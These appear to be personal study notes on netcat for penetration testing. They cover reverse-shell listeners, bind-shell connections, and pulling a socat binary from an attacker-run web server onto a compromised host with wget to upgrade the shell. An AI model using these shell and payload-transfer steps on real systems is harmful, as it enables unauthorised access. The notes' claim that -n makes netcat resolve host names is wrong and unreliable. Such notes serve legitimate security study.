- Netcat is the basic tool for all things networking. Keep in mind if you open a netcat shell on a device it will be uninteractive by default and very unstable which is why it's typically suggest that once you have it if you need to go any farther you start [[#Upgrading]].
## Listener
- To open up a netcat listener for a [[What is a Shell?#Reverse Shell]] use the following syntax
	- nc -lvnp \<port-number\>
		-  -l is used to tell netcat that this will be a listener
		-  -v is used to request verbose output
		-  -n is used to tell netcat to resolve host names or use [[Domain Name#Domain Name Server]]
-  If you choose a port below 1024 you will need to use sudo when starting your listener
## Connecter
- If a listener is already active on a device then you can connect to it and obtain a [[What is a Shell?#Bind Shell]] using the following syntax
	- nc \<target-ip\> \<chosen-port\>

# Upgrading
- A common way of Upgrading would be the following steps
	- Download a socat static compiled binary
	- Start a web server on a device you control using the following syntax
		- sudo python3 -m http.server 80
	- From your netcat shell download the socat static compiled binary with the following syntax
		- wget \<your ip\>/socat -O /tmp/socat
- This will set you up to use a [[Basic Socat]] shell instead